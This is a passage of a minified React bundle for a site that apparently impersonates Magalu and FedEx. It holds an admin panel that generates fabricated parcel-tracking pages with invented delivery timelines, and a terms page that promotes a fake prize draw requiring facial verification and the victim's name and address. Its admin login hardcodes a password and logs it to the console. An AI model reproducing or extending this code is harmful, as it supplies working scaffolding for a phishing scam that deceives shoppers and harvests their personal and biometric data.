t=e.replace("tracking_","");if(!n.some(e=>e.code===t))try{const n=JSON.parse(localStorage.getItem(e));r.push(zt({code:t},n));const a={code:t,recipient_name:n.recipientName||n.recipient_name||"",address:n.address||"",last_update:n.lastUpdate||n.last_update||(new Date).toISOString(),timeline:n.timeline||[],status:n.status||"postado",is_verified:void 0!==n.verified?n.verified:void 0!==n.is_verified&&n.is_verified,cep:n.cep||null};ja.from("trackings").upsert([a],{onConflict:"code"}).then(e=>{let{error:n}=e;n?console.error("Erro ao migrar ".concat(t," para Supabase:"),n):console.log("\u2705 ".concat(t," migrado para Supabase com sucesso!"))}).catch(e=>{console.error("Erro ao migrar ".concat(t,":"),e)})}catch(Oa){console.error("Erro ao processar rastreamento do localStorage:",Oa)}}}const a=[...n,...r];l(a)}catch(s){console.error("Erro ao carregar rastreamentos:",s),l([])}},v=e=>{e.preventDefault();const a=n.trim(),s="GT@5513".trim();console.log("Senha digitada:",a,"Tamanho:",a.length),console.log("Senha esperada:",s,"Tamanho:",s.length),console.log("S\xe3o iguais?",a===s),a===s?(t(!0),sessionStorage.setItem("admin_authenticated","true"),o(""),g()):(o("Senha incorreta"),r(""))},y=()=>{const e=Math.floor(1e10*Math.random()).toString().padStart(10,"0");return"".concat("PQ").concat(e).concat("BR")},b=e=>({postado:"Objeto postado ap\xf3s a bonifica\xe7\xe3o",movimento:"O pacote est\xe1 transitando entre a ag\xeancia e o centro de distribui\xe7\xe3o mais pr\xf3ximo",transito:"Pacote em rota para o centro de distribui\xe7\xe3o regional",distribuicao:"Pacote saiu para entrega",entregue:"Pacote entregue com sucesso ao destinat\xe1rio"}[e]||""),w=e=>({postado:"Postagem",movimento:"Transporte",transito:"Log\xedstica",distribuicao:"Distribui\xe7\xe3o",entregue:"Entrega"}[e]||"Processamento"),_=e=>({postado:"Seu pacote foi postado",movimento:"Seu pacote est\xe1 em movimento",transito:"Seu pacote est\xe1 em tr\xe2nsito",distribuicao:"Seu pacote est\xe1 em distribui\xe7\xe3o",entregue:"Seu pacote foi entregue"}[e]||e);return e?(0,Te.jsxs)("div",{className:"admin-container",children:[(0,Te.jsxs)("div",{className:"admin-header",children:[(0,Te.jsx)("h1",{className:"admin-title",children:"\xc1rea Administrativa"}),(0,Te.jsx)("button",{onClick:()=>{t(!1),sessionStorage.removeItem("admin_authenticated"),r(""),l([]),u(!1)},className:"admin-logout",children:"Sair"})]}),(0,Te.jsxs)("div",{className:"admin-content",children:[(0,Te.jsx)("div",{className:"admin-actions",children:(0,Te.jsx)("button",{onClick:()=>u(!c),className:"admin-button primary",children:c?"Cancelar":"+ Criar Nova P\xe1gina de Rastreamento"})}),c&&(0,Te.jsxs)("div",{className:"admin-form-card",children:[(0,Te.jsx)("h2",{className:"admin-form-title",children:"Nova P\xe1gina de Rastreamento"}),(0,Te.jsxs)("form",{onSubmit:async e=>{e.preventDefault();const t=(d.trackingCode||y()).trim().toUpperCase(),n=((e,t,n,r)=>{const a=new Date(t),s=[];let o="Belo Horizonte",i="MG";if(n){const e=n.match(/(.+?)\s*-\s*([A-Z]{2})/);if(e)o=e[1].trim(),i=e[2].trim();else{var l,c;const e=n.split("-");o=(null===(l=e[0])||void 0===l?void 0:l.trim())||"Belo Horizonte",i=(null===(c=e[1])||void 0===c?void 0:c.trim())||"MG"}}if(s.push({date:new Date(a.getTime()-2592e5).toISOString().split("T")[0],dateTime:new Date(new Date(a.getTime()-2592e5).setHours(14,0,0,0)).toISOString(),status:"Seu pacote foi postado",description:"Objeto postado ap\xf3s a bonifica\xe7\xe3o",location:"".concat(o," - ").concat(i),sector:"Postagem"}),["movimento","transito","distribuicao","entregue"].includes(e)&&s.push({date:new Date(a.getTime()-1728e5).toISOString().split("T")[0],dateTime:new Date(new Date(a.getTime()-1728e5).setHours(16,30,0,0)).toISOString(),status:"Seu pacote est\xe1 em movimento",description:"O pacote est\xe1 transitando entre a ag\xeancia e o centro de distribui\xe7\xe3o mais pr\xf3ximo",location:"Centro de Distribui\xe7\xe3o - ".concat(o," - ").concat(i),sector:"Transporte"}),["transito","distribuicao","entregue"].includes(e)&&s.push({date:new Date(a.getTime()-864e5).toISOString().split("T")[0],dateTime:new Date(new Date(a.getTime()-864e5).setHours(18,0,0,0)).toISOString(),status:"Seu pacote est\xe1 em tr\xe2nsito",description:"Pacote em rota para o centro de distribui\xe7\xe3o regional",location:"Unidade de Log\xedstica Regional - ".concat(o," - ").concat(i),sector:"Log\xedstica"}),["distribuicao","entregue"].includes(e)&&s.push({date:new Date(a.getTime()-432e5).toISOString().split("T")[0],dateTime:new Date(new Date(a.getTime()-432e5).setHours(8,0,0,0)).toISOString(),status:"Seu pacote est\xe1 em distribui\xe7\xe3o",description:"Pacote saiu para entrega",location:"Ag\xeancia de Distribui\xe7\xe3o - ".concat(o," - ").concat(i),sector:"Distribui\xe7\xe3o"}),"entregue"===e)s.push({date:t,dateTime:new Date(new Date(a).setHours(14,30,0,0)).toISOString(),status:"Seu pacote foi entregue",description:"Pacote entregue com sucesso ao destinat\xe1rio",location:"".concat(o," - ").concat(i),sector:"Entrega"});else if("distribuicao"===e){const e=s[s.length-1];e.date=t,e.dateTime=new Date(new Date(a).setHours(10,0,0,0)).toISOString(),e.description="Pacote saiu para entrega",e.location="Ag\xeancia de Distribui\xe7\xe3o - ".concat(o," - ").concat(i)}else s.push({date:t,dateTime:new Date(new Date(a).setHours(10,0,0,0)).toISOString(),status:_(e),description:r||b(e),location:n||"".concat(o," - ").concat(i),sector:w(e)});return s})(d.status,d.date,d.location,d.description),r=d.addressNumber?"".concat(d.address,", ").concat(d.addressNumber).trim():d.address,a={code:t,recipient_name:d.recipientName,address:r,last_update:(new Date).toISOString(),timeline:n,status:d.status,is_verified:!1,cep:d.cep?d.cep.replace(/\D/g,""):null};try{console.log("Salvando rastreamento no Supabase:",t,a);const{data:e,error:s}=await ja.from("trackings").upsert([a],{onConflict:"code"});s?(console.error("Erro ao salvar no Supabase:",s),console.error("Detalhes do erro:",JSON.stringify(s,null,2)),localStorage.setItem("tracking_".concat(t),JSON.stringify({trackingCode:t,recipientName:d.recipientName,address:r,lastUpdate:(new Date).toISOString(),timeline:n,status:d.status,verified:!1})),alert("Salvo localmente (erro ao conectar com o servidor).")):(console.log("\u2705 Dados salvos no Supabase com sucesso!",e),localStorage.setItem("tracking_".concat(t),JSON.stringify({trackingCode:t,recipientName:d.recipientName,address:r,lastUpdate:(new Date).toISOString(),timeline:n,status:d.status,verified:!1})))}catch(s){console.error("Erro ao salvar:",s),localStorage.setItem("tracking_".concat(t),JSON.stringify({trackingCode:t,recipientName:d.recipientName,address:r,lastUpdate:(new Date).toISOString(),timeline:n,status:d.status,verified:!1})),alert("Salvo localmente (erro ao conectar com o servidor).")}h({trackingCode:y(),recipientName:"",cep:"",address:"",addressNumber:"",status:"postado",description:"Objeto postado ap\xf3s a bonifica\xe7\xe3o",location:"",date:(new Date).toISOString().split("T")[0]}),u(!1),await g(),alert("P\xe1gina de rastreamento criada! C\xf3digo: ".concat(t,"\nURL: /rastreamento/").concat(t))},className:"admin-form",children:[(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"C\xf3digo de Rastreamento (gerado automaticamente)"}),(0,Te.jsxs)("div",{style:{display:"flex",gap:"8px",alignItems:"center"},children:[(0,Te.jsx)("input",{type:"text",value:d.trackingCode,onChange:e=>h(zt(zt({},d),{},{trackingCode:e.target.value})),placeholder:"PQ2187911652BR",className:"admin-input",readOnly:!0,style:{flex:1,backgroundColor:"#f5f5f5",cursor:"not-allowed"}}),(0,Te.jsx)("button",{type:"button",onClick:()=>{const e=y();h(zt(zt({},d),{},{trackingCode:e}))},className:"admin-button small",style:{padding:"10px 16px",fontSize:"14px",whiteSpace:"nowrap"},children:"\ud83d\udd04 Gerar Novo"})]})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"Nome do Destinat\xe1rio *"}),(0,Te.jsx)("input",{type:"text",value:d.recipientName,onChange:e=>h(zt(zt({},d),{},{recipientName:e.target.value})),required:!0,className:"admin-input"})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"CEP *"}),(0,Te.jsxs)("div",{style:{display:"flex",gap:"8px",alignItems:"center"},children:[(0,Te.jsx)("input",{type:"text",value:d.cep,onChange:async e=>{const t=(e=>{const t=e.replace(/\D/g,"");return t.length<=8?t.replace(/(\d{5})(\d{3})/,"$1-$2"):e})(e.target.value);h(e=>zt(zt({},e),{},{cep:t}));const n=t.replace(/\D/g,"");8===n.length?setTimeout(async()=>{const e=await(async e=>{const t=e.replace(/\D/g,"");if(8!==t.length)return p(!1),null;p(!0);try{const e="https://viacep.com.br/ws/".concat(t,"/json/");console.log("Buscando CEP:",t);const n=await fetch(e);if(!n.ok)throw new Error("HTTP error! status: ".concat(n.status));const r=await n.json();if(console.log("Resposta da API:",r),r.erro)return alert("CEP n\xe3o encontrado. Por favor, verifique o CEP digitado."),p(!1),null;const a=[];r.logradouro&&a.push(r.logradouro),r.bairro&&a.push(r.bairro),r.localidade&&a.push(r.localidade),r.uf&&a.push(r.uf);const s=a.join(", ");return p(!1),{address:s,city:r.localidade||"",state:r.uf||""}}catch(s){return console.error("Erro ao buscar CEP:",s),p(!1),alert("Erro ao buscar endere\xe7o. Verifique sua conex\xe3o e tente novamente."),null}})(t);e&&h(t=>zt(zt({},t),{},{address:e.address,location:"".concat(e.city," - ").concat(e.state)}))},500):n.length<8&&h(e=>zt(zt({},e),{},{address:"",location:""}))},placeholder:"00000-000",maxLength:"9",className:"admin-input",required:!0,style:{maxWidth:"200px"}}),f&&(0,Te.jsx)("span",{style:{color:"#666",fontSize:"14px"},children:"Buscando..."})]})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"Endere\xe7o (preenchido automaticamente) *"}),(0,Te.jsx)("textarea",{value:d.address,onChange:e=>h(zt(zt({},d),{},{address:e.target.value})),required:!0,rows:"2",className:"admin-input",placeholder:"Endere\xe7o ser\xe1 preenchido automaticamente ao digitar o CEP"})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"N\xfamero *"}),(0,Te.jsx)("input",{type:"text",value:d.addressNumber,onChange:e=>h(zt(zt({},d),{},{addressNumber:e.target.value})),placeholder:"123",className:"admin-input",required:!0,style:{maxWidth:"150px"}})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"Status *"}),(0,Te.jsxs)("select",{value:d.status,onChange:e=>h(zt(zt({},d),{},{status:e.target.value})),className:"admin-input",required:!0,children:[(0,Te.jsx)("option",{value:"postado",children:"Postado"}),(0,Te.jsx)("option",{value:"movimento",children:"Em Movimento"}),(0,Te.jsx)("option",{value:"transito",children:"Em Tr\xe2nsito"}),(0,Te.jsx)("option",{value:"distribuicao",children:"Em Distribui\xe7\xe3o"}),(0,Te.jsx)("option",{value:"entregue",children:"Entregue"})]})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"Localiza\xe7\xe3o"}),(0,Te.jsx)("input",{type:"text",value:d.location,onChange:e=>h(zt(zt({},d),{},{location:e.target.value})),placeholder:"Belo Horizonte - MG",className:"admin-input"})]}),(0,Te.jsxs)("div",{className:"form-group",children:[(0,Te.jsx)("label",{children:"Data do Evento"}),(0,Te.jsx)("input",{type:"date",value:d.date,onChange:e=>h(zt(zt({},d),{},{date:e.target.value})),className:"admin-input",required:!0})]}),(0,Te.jsx)("div",{style:{gridColumn:"1 / -1",display:"flex",justifyContent:"center",marginTop:"8px"},children:(0,Te.jsx)("button",{type:"submit",className:"admin-button primary",style:{minWidth:"280px"},children:"Criar P\xe1gina de Rastreamento"})})]})]}),(0,Te.jsxs)("div",{className:"admin-list",children:[(0,Te.jsxs)("h2",{className:"admin-list-title",children:["P\xe1ginas de Rastreamento (",i.length,")"]}),0===i.length?(0,Te.jsx)("div",{className:"admin-empty",children:"Nenhuma p\xe1gina de rastreamento criada ainda."}):(0,Te.jsx)("div",{className:"tracking-list",children:i.map(e=>(0,Te.jsxs)("div",{className:"tracking-item ".concat(e.verified?"verified":""),children:[(0,Te.jsxs)("div",{className:"tracking-item-info",children:[(0,Te.jsxs)("div",{className:"tracking-item-header",children:[(0,Te.jsx)("div",{className:"tracking-item-code",children:e.code}),e.verified&&(0,Te.jsxs)("span",{className:"verified-badge",children:[(0,Te.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("path",{d:"M20 6L9 17l-5-5"})}),"Verificado"]})]}),(0,Te.jsx)("div",{className:"tracking-item-name",children:e.recipientName||"N/A"}),(0,Te.jsx)("div",{className:"tracking-item-address",children:e.address||"N/A"})]}),(0,Te.jsxs)("div",{className:"tracking-item-actions",children:[(0,Te.jsx)("button",{onClick:()=>m("/rastreamento/".concat(e.code)),className:"admin-button small",children:"Ver"}),(0,Te.jsx)("button",{onClick:()=>(e=>{const t="".concat(window.location.origin,"/rastreamento/").concat(e);navigator.clipboard.writeText(t).then(()=>{alert("Link copiado para a \xe1rea de transfer\xeancia!")})})(e.code),className:"admin-button small",children:"Copiar Link"}),(0,Te.jsx)("button",{onClick:()=>(async e=>{try{const{data:t,error:n}=await ja.from("trackings").select("is_verified").eq("code",e).single();if(n){console.error("Erro ao buscar rastreamento:",n);const t=localStorage.getItem("tracking_".concat(e));if(t)try{const n=JSON.parse(t);n.verified=!n.verified,localStorage.setItem("tracking_".concat(e),JSON.stringify(n))}catch(Oa){console.error("Erro ao atualizar status:",Oa)}return void await g()}const{error:r}=await ja.from("trackings").update({is_verified:!t.is_verified}).eq("code",e);r&&console.error("Erro ao atualizar no Supabase:",r)}catch(s){console.error("Erro ao atualizar status:",s)}await g()})(e.code),className:"admin-button small ".concat(e.verified?"verified-button":"verify-button"),children:e.verified?(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("path",{d:"M20 6L9 17l-5-5"})}),"Verificado"]}):(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,Te.jsx)("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),(0,Te.jsx)("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]}),"Marcar Verificado"]})}),(0,Te.jsx)("button",{onClick:()=>(async e=>{if(!window.confirm("\u26a0\ufe0f ATEN\xc7\xc3O: Deseja realmente excluir o rastreamento ".concat(e,"?")))return;if(window.confirm("\ud83d\udd34 CONFIRMA\xc7\xc3O FINAL: Esta a\xe7\xe3o n\xe3o pode ser desfeita!\n\nExcluir rastreamento ".concat(e,"?"))){try{const{data:t,error:n}=await ja.from("trackings").delete().eq("code",e).select();n?(console.error("\u274c Erro ao deletar do Supabase:",n),alert("Erro ao deletar: ".concat(n.message,"\n\nOs dados podem estar protegidos por pol\xedticas RLS.")),localStorage.removeItem("tracking_".concat(e))):(console.log("\u2705 Rastreamento deletado:",t),localStorage.removeItem("tracking_".concat(e)),alert("Rastreamento ".concat(e," exclu\xeddo com sucesso.")))}catch(s){console.error("\u274c Erro ao deletar:",s),alert("Erro ao deletar: ".concat(s.message)),localStorage.removeItem("tracking_".concat(e))}await g()}})(e.code),className:"admin-button small danger",children:"Excluir"})]})]},e.code))})]})]})]}):(0,Te.jsx)("div",{className:"admin-container",children:(0,Te.jsx)("div",{className:"admin-login",children:(0,Te.jsxs)("div",{className:"admin-login-card",children:[(0,Te.jsx)("h1",{className:"admin-title",children:"\xc1rea Administrativa"}),(0,Te.jsx)("p",{className:"admin-subtitle",children:"Acesso restrito"}),(0,Te.jsxs)("form",{onSubmit:v,className:"admin-form",children:[(0,Te.jsx)("input",{type:"password",placeholder:"Senha",value:n,onChange:e=>{r(e.target.value),o("")},className:"admin-input",autoFocus:!0}),s&&(0,Te.jsx)("div",{className:"admin-error",children:s}),(0,Te.jsx)("button",{type:"submit",className:"admin-button",children:"Entrar"})]})]})})})},Na=()=>{const e=re();return(0,a.useEffect)(()=>{document.title="FedEx - Termos e Condi\xe7\xf5es"},[]),(0,Te.jsxs)("div",{className:"termos-container",children:[(0,Te.jsx)("header",{className:"termos-header",children:(0,Te.jsxs)("div",{className:"termos-header-content",children:[(0,Te.jsxs)("div",{className:"termos-logo",children:[(0,Te.jsx)("img",{src:"/logo-magalu-azul (1).png",alt:"Magalu",className:"termos-logo-img"}),(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"termos-logo-img"})]}),(0,Te.jsx)("button",{className:"termos-back-button",onClick:()=>e("/"),children:"Voltar ao In\xedcio"})]})}),(0,Te.jsxs)("div",{className:"termos-content",children:[(0,Te.jsx)("h1",{className:"termos-title",children:"Termos e Condi\xe7\xf5es"}),(0,Te.jsx)("p",{className:"termos-updated",children:"\xdaltima atualiza\xe7\xe3o: 23 de fevereiro de 2025"}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"1. Aceita\xe7\xe3o dos Termos"}),(0,Te.jsx)("p",{className:"termos-text",children:"Ao acessar e utilizar este site, voc\xea concorda em cumprir e estar vinculado aos seguintes termos e condi\xe7\xf5es de uso. Se voc\xea n\xe3o concorda com qualquer parte destes termos, n\xe3o deve utilizar este servi\xe7o."}),(0,Te.jsx)("p",{className:"termos-text",children:"Estes termos se aplicam a todos os visitantes, usu\xe1rios e outras pessoas que acessam ou utilizam o servi\xe7o de rastreamento e verifica\xe7\xe3o de entrega oferecido pela parceria entre Magalu (CNPJ: 47.960.950/0001-21) e FedEx (CNPJ: 10.970.887/0001-02)."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"2. Programa de Bonifica\xe7\xe3o Magalu"}),(0,Te.jsx)("h3",{className:"termos-subtitle",children:"2.1. Participa\xe7\xe3o"}),(0,Te.jsx)("p",{className:"termos-text",children:"O Programa de Bonifica\xe7\xe3o Magalu \xe9 uma iniciativa promocional que permite aos clientes participarem de sorteios e concorrerem a pr\xeamios exclusivos ao confirmarem suas entregas atrav\xe9s do sistema de verifica\xe7\xe3o facial."}),(0,Te.jsx)("h3",{className:"termos-subtitle",children:"2.2. Como Participar"}),(0,Te.jsx)("p",{className:"termos-text",children:"Para participar do programa, voc\xea deve:"}),(0,Te.jsxs)("ul",{className:"termos-list",children:[(0,Te.jsx)("li",{children:"Ter realizado uma compra atrav\xe9s da Magalu com entrega pela FedEx"}),(0,Te.jsx)("li",{children:"Confirmar a entrega atrav\xe9s do sistema de verifica\xe7\xe3o facial dispon\xedvel neste site"}),(0,Te.jsx)("li",{children:"Fornecer os dados solicitados de forma correta e completa"}),(0,Te.jsx)("li",{children:"Aceitar estes termos e condi\xe7\xf5es"})]}),(0,Te.jsx)("h3",{className:"termos-subtitle",children:"2.3. Pr\xeamios"}),(0,Te.jsx)("p",{className:"termos-text",children:"Os pr\xeamios dispon\xedveis no programa incluem, mas n\xe3o se limitam a: smartphones, tablets, vale-compras, descontos exclusivos e outros benef\xedcios. A lista completa de pr\xeamios e suas especifica\xe7\xf5es ser\xe3o divulgadas atrav\xe9s dos canais oficiais da Magalu."}),(0,Te.jsx)("h3",{className:"termos-subtitle",children:"2.4. Sorteios"}),(0,Te.jsx)("p",{className:"termos-text",children:"Os sorteios ser\xe3o realizados periodicamente conforme crit\xe9rios estabelecidos pela Magalu. A cada confirma\xe7\xe3o de entrega, voc\xea acumula pontos de participa\xe7\xe3o que aumentam suas chances de ganhar. Quanto mais entregas confirmadas, maiores s\xe3o suas chances."}),(0,Te.jsx)("h3",{className:"termos-subtitle",children:"2.5. Elegibilidade"}),(0,Te.jsx)("p",{className:"termos-text",children:"Podem participar do programa pessoas f\xedsicas, maiores de 18 anos, residentes no Brasil. Funcion\xe1rios da Magalu, FedEx e empresas parceiras n\xe3o podem participar. A Magalu se reserva o direito de verificar a elegibilidade dos participantes."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"3. Verifica\xe7\xe3o Facial"}),(0,Te.jsx)("p",{className:"termos-text",children:"O sistema de verifica\xe7\xe3o facial \xe9 utilizado para confirmar a identidade do destinat\xe1rio e garantir a seguran\xe7a das entregas. Ao utilizar este servi\xe7o, voc\xea concorda em:"}),(0,Te.jsxs)("ul",{className:"termos-list",children:[(0,Te.jsx)("li",{children:"Fornecer uma imagem facial clara e atualizada"}),(0,Te.jsx)("li",{children:"Permitir o uso de sua imagem para fins de verifica\xe7\xe3o de entrega"}),(0,Te.jsx)("li",{children:"Compreender que os dados biom\xe9tricos coletados ser\xe3o utilizados exclusivamente para confirma\xe7\xe3o de entrega"}),(0,Te.jsx)("li",{children:"Autorizar o armazenamento tempor\xe1rio dos dados conforme pol\xedtica de privacidade"})]}),(0,Te.jsx)("p",{className:"termos-text",children:"Os dados coletados atrav\xe9s da verifica\xe7\xe3o facial s\xe3o tratados de acordo com a Lei Geral de Prote\xe7\xe3o de Dados (LGPD) e nossa Pol\xedtica de Privacidade."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"4. Rastreamento de Encomendas"}),(0,Te.jsx)("p",{className:"termos-text",children:"O servi\xe7o de rastreamento permite que voc\xea acompanhe o status de suas encomendas em tempo real. As informa\xe7\xf5es de rastreamento s\xe3o fornecidas pela FedEx e atualizadas conforme o progresso da entrega."}),(0,Te.jsx)("p",{className:"termos-text",children:"A Magalu e a FedEx n\xe3o se responsabilizam por atrasos causados por fatores externos, incluindo mas n\xe3o limitados a: condi\xe7\xf5es clim\xe1ticas, problemas de transporte, quest\xf5es aduaneiras ou outras circunst\xe2ncias fora de seu controle."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"5. Privacidade e Prote\xe7\xe3o de Dados"}),(0,Te.jsx)("p",{className:"termos-text",children:"A prote\xe7\xe3o de seus dados pessoais \xe9 uma prioridade. Todas as informa\xe7\xf5es coletadas s\xe3o tratadas de acordo com a Lei Geral de Prote\xe7\xe3o de Dados (Lei n\xba 13.709/2018) e nossa Pol\xedtica de Privacidade."}),(0,Te.jsx)("p",{className:"termos-text",children:"Os dados coletados incluem: nome, endere\xe7o, c\xf3digo de rastreamento, imagem facial para verifica\xe7\xe3o e informa\xe7\xf5es de entrega. Estes dados s\xe3o utilizados exclusivamente para:"}),(0,Te.jsxs)("ul",{className:"termos-list",children:[(0,Te.jsx)("li",{children:"Processamento e confirma\xe7\xe3o de entregas"}),(0,Te.jsx)("li",{children:"Participa\xe7\xe3o no programa de bonifica\xe7\xe3o"}),(0,Te.jsx)("li",{children:"Melhoria dos servi\xe7os oferecidos"}),(0,Te.jsx)("li",{children:"Comunica\xe7\xe3o sobre status de entregas e pr\xeamios"})]}),(0,Te.jsx)("p",{className:"termos-text",children:"Voc\xea tem o direito de acessar, corrigir, excluir ou solicitar a portabilidade de seus dados pessoais a qualquer momento, entrando em contato atrav\xe9s dos canais de atendimento dispon\xedveis."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"6. Limita\xe7\xe3o de Responsabilidade"}),(0,Te.jsx)("p",{className:"termos-text",children:"A Magalu e a FedEx n\xe3o se responsabilizam por:"}),(0,Te.jsxs)("ul",{className:"termos-list",children:[(0,Te.jsx)("li",{children:"Danos diretos, indiretos, incidentais ou consequenciais resultantes do uso ou impossibilidade de uso do servi\xe7o"}),(0,Te.jsx)("li",{children:"Perda de dados ou informa\xe7\xf5es"}),(0,Te.jsx)("li",{children:"Interrup\xe7\xf5es ou falhas no servi\xe7o"}),(0,Te.jsx)("li",{children:"Decis\xf5es tomadas com base em informa\xe7\xf5es fornecidas pelo servi\xe7o"}),(0,Te.jsx)("li",{children:"Problemas t\xe9cnicos ou de conectividade"})]}),(0,Te.jsx)("p",{className:"termos-text",children:'O servi\xe7o \xe9 fornecido "como est\xe1" e "conforme dispon\xedvel", sem garantias de qualquer tipo, expressas ou impl\xedcitas.'})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"7. Propriedade Intelectual"}),(0,Te.jsx)("p",{className:"termos-text",children:"Todo o conte\xfado deste site, incluindo mas n\xe3o limitado a textos, gr\xe1ficos, logos, \xedcones, imagens, clipes de \xe1udio, downloads digitais e compila\xe7\xf5es de dados, \xe9 propriedade da Magalu, FedEx ou seus fornecedores de conte\xfado e \xe9 protegido por leis de direitos autorais brasileiras e internacionais."}),(0,Te.jsx)("p",{className:"termos-text",children:"Voc\xea n\xe3o pode reproduzir, distribuir, modificar, criar trabalhos derivados, exibir publicamente, executar publicamente, republicar, baixar, armazenar ou transmitir qualquer material do site sem autoriza\xe7\xe3o pr\xe9via por escrito."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"8. Modifica\xe7\xf5es dos Termos"}),(0,Te.jsx)("p",{className:"termos-text",children:"Reservamo-nos o direito de modificar estes termos a qualquer momento. As altera\xe7\xf5es entrar\xe3o em vigor imediatamente ap\xf3s sua publica\xe7\xe3o neste site. \xc9 sua responsabilidade revisar periodicamente estes termos para estar ciente de quaisquer modifica\xe7\xf5es."}),(0,Te.jsx)("p",{className:"termos-text",children:"O uso continuado do servi\xe7o ap\xf3s a publica\xe7\xe3o de altera\xe7\xf5es constitui sua aceita\xe7\xe3o dos termos modificados."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"9. Cancelamento e Encerramento"}),(0,Te.jsx)("p",{className:"termos-text",children:"Reservamo-nos o direito de encerrar ou suspender seu acesso ao servi\xe7o, sem aviso pr\xe9vio, por qualquer motivo, incluindo mas n\xe3o limitado a viola\xe7\xe3o destes termos e condi\xe7\xf5es."}),(0,Te.jsx)("p",{className:"termos-text",children:"Voc\xea pode encerrar sua participa\xe7\xe3o no programa a qualquer momento, entrando em contato atrav\xe9s dos canais de atendimento. No entanto, pr\xeamios j\xe1 acumulados podem ser perdidos conforme as regras do programa."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"10. Lei Aplic\xe1vel e Foro"}),(0,Te.jsx)("p",{className:"termos-text",children:"Estes termos e condi\xe7\xf5es s\xe3o regidos pelas leis da Rep\xfablica Federativa do Brasil. Qualquer disputa relacionada a estes termos ser\xe1 resolvida exclusivamente nos tribunais competentes da cidade de S\xe3o Paulo, Estado de S\xe3o Paulo, renunciando as partes a qualquer outro foro, por mais privilegiado que seja."})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"11. Contato"}),(0,Te.jsx)("p",{className:"termos-text",children:"Para quest\xf5es relacionadas a estes termos e condi\xe7\xf5es, ao programa de bonifica\xe7\xe3o ou aos servi\xe7os oferecidos, entre em contato:"}),(0,Te.jsxs)("div",{className:"termos-contact",children:[(0,Te.jsxs)("div",{className:"contact-item",children:[(0,Te.jsx)("strong",{children:"Magalu"}),(0,Te.jsx)("p",{children:"CNPJ: 47.960.950/0001-21"}),(0,Te.jsxs)("p",{children:["Website: ",(0,Te.jsx)("a",{href:"https://www.magazineluiza.com.br",target:"_blank",rel:"noopener noreferrer",children:"www.magazineluiza.com.br"})]}),(0,Te.jsxs)("p",{children:["Instagram: ",(0,Te.jsx)("a",{href:"https://www.instagram.com/magalu/",target:"_blank",rel:"noopener noreferrer",children:"@magalu"})]})]}),(0,Te.jsxs)("div",{className:"contact-item",children:[(0,Te.jsx)("strong",{children:"FedEx"}),(0,Te.jsx)("p",{children:"CNPJ: 10.970.887/0001-02"}),(0,Te.jsxs)("p",{children:["Website: ",(0,Te.jsx)("a",{href:"https://www.fedex.com/pt-br/home.html",target:"_blank",rel:"noopener noreferrer",children:"www.fedex.com"})]}),(0,Te.jsxs)("p",{children:["Instagram: ",(0,Te.jsx)("a",{href:"https://www.instagram.com/fedex/",target:"_blank",rel:"noopener noreferrer",children:"@fedex"})]})]})]})]}),(0,Te.jsxs)("section",{className:"termos-section",children:[(0,Te.jsx)("h2",{className:"termos-section-title",children:"12. Disposi\xe7\xf5es Gerais"}),(0,Te.jsx)("p",{className:"termos-text",children:"Se qualquer disposi\xe7\xe3o destes termos for considerada inv\xe1lida ou inexequ\xedvel, as demais disposi\xe7\xf5es permanecer\xe3o em pleno vigor e efeito. A falha em exercer qualquer direito ou disposi\xe7\xe3o destes termos n\xe3o constituir\xe1 uma ren\xfancia a tal direito ou disposi\xe7\xe3o."}),(0,Te.jsx)("p",{className:"termos-text",children:"Estes termos constituem o acordo completo entre voc\xea e a parceria Magalu/FedEx em rela\xe7\xe3o ao uso do servi\xe7o e substituem todos os acordos anteriores ou contempor\xe2neos."})]}),(0,Te.jsx)("div",{className:"termos-actions",children:(0,Te.jsx)("button",{className:"termos-button",onClick:()=>e("/"),children:"Voltar ao In\xedcio"})})]}),(0,Te.jsx)("footer",{className:"termos-footer",children:(0,Te.jsxs)("div",{className:"termos-footer-content",children:[(0,Te.jsx)("p",{className:"termos-footer-text",children:"\xa9 2025 